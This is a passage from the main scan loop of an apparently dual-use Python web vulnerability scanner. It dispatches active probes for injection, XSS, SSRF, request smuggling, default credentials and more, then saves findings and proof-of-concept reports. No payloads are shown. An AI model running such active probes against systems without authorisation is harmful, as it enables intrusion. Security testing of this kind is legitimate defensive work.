            check_info_disclosure(r, findings, cfg)
            check_jwt_tokens(r, findings, cfg)
            check_api_key_leakage(r, findings, cfg)
            check_outdated_server(r, findings, cfg)
            check_verbose_errors(r, findings, cfg)
            check_debug_mode(r, findings, cfg)
            check_weak_hash(r, findings, cfg)
            check_metadata_exposure(r, findings, cfg)
            check_content_type_mismatch(r, findings, cfg)
            check_excessive_data_exposure(r, findings, cfg)

            # ── Crawl ──
            params, forms = [], []
            if cfg.profile != "quick":
                params, forms = crawl(session, target, cfg)

            check_csrf_missing(r, params, findings, cfg)

            # ── Active parameter-based checks ──
            def should_run(name): return name not in cfg.skip_checks

            check_crypto_exposure(target, session, params, findings, cfg)

            if should_run("sqli"):
                check_sqli(target, session, params, forms, findings, cfg)
                check_timing_sqli(target, session, params, findings, cfg)
            if should_run("xss"):
                check_xss(target, session, params, forms, findings, cfg)
            if should_run("redirect"):
                check_open_redirect(target, session, params, findings, cfg)
            if should_run("traversal"):
                check_path_traversal(target, session, params, findings, cfg)
            if should_run("ssrf"):
                check_ssrf(target, session, params, findings, cfg)
            if should_run("ssti"):
                check_ssti(target, session, params, findings, cfg)
            if should_run("xxe"):
                check_xxe(target, session, params, findings, cfg)
            if should_run("cmd"):
                check_command_injection(target, session, params, findings, cfg)
            if should_run("ldap"):
                check_ldap_injection(target, session, params, findings, cfg)
            if should_run("idor"):
                check_idor(target, session, params, findings, cfg)
            if should_run("nosql"):
                check_nosql_injection(target, session, params, findings, cfg)
            if should_run("crlf"):
                check_crlf_injection(target, session, params, findings, cfg)
            if should_run("ssti"):
                check_prototype_pollution(target, session, findings, cfg)
            if should_run("mass_assignment"):
                check_mass_assignment(target, session, findings, cfg)
            if should_run("traversal"):
                check_path_normalization_bypass(target, session, params, findings, cfg)

            # ── Server-level active checks ──
            check_host_header(target, session, findings, cfg)
            check_backup_files(target, session, findings, cfg)
            check_backup_archives(target, session, findings, cfg)
            check_http_methods(target, session, findings, cfg)
            check_default_credentials(target, session, findings, cfg)
            check_ssl_tls(target, session, findings, cfg)
            check_directory_listing(target, session, findings, cfg)
            check_source_code_disclosure(target, session, findings, cfg)
            check_graphql_introspection(target, session, findings, cfg)
            check_oauth_config_exposure(target, session, findings, cfg)
            check_account_enumeration_patterns(target, session, findings, cfg)
            check_insecure_deserialization(target, session, findings, cfg)
            check_file_upload_issues(target, session, findings, cfg)
            check_http_smuggling(target, session, findings, cfg)
            check_xml_entity_expansion(target, session, findings, cfg)
            check_subdomain_enumeration(target, findings, cfg)

            if cfg.profile == "full":
                check_rate_limiting(target, session, findings, cfg)
                check_xxe(target, session, params, findings, cfg)

            # ── Advanced attack checks ──
            if should_run("cache_poisoning"):
                check_web_cache_poisoning(target, session, findings, cfg)
            if should_run("dom_xss"):
                check_dom_xss(target, session, findings, cfg)
            if should_run("http2"):
                check_http2_attacks(target, session, findings, cfg)
            if should_run("websocket"):
                check_websocket_security(target, session, findings, cfg)
            if should_run("bpla"):
                check_bpla(target, session, findings, cfg)

            # ── Summary ──
            counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
            for f in findings:
                if f.severity in counts:
                    counts[f.severity] += 1

            pr(f"\n{B}{'─'*56}{RST}", cfg)
            pr(f"{B}Results for {target}:{RST}", cfg)
            pr(f"  {R}Critical: {counts['CRITICAL']}{RST}  "
               f"{Y}High: {counts['HIGH']}{RST}  "
               f"{Y}Medium: {counts['MEDIUM']}{RST}  "
               f"{C}Low: {counts['LOW']}{RST}", cfg)

            save_json(findings, cfg, target)
            save_html(findings, cfg, target)
            save_pocs(findings, cfg, target)

            all_findings.extend(findings)

    except KeyboardInterrupt:
        logger.warning("Scan aborted by user (Ctrl+C)")
    except Exception as e:
        logger.exception(f"Unexpected error during scan: {e}")

    pr(f"\n{B}{'═'*56}{RST}", cfg)
    pr(f"{B}{BOLD}Scan complete. Total findings: {len(all_findings)}{RST}", cfg)


if __name__ == "__main__":
    main()
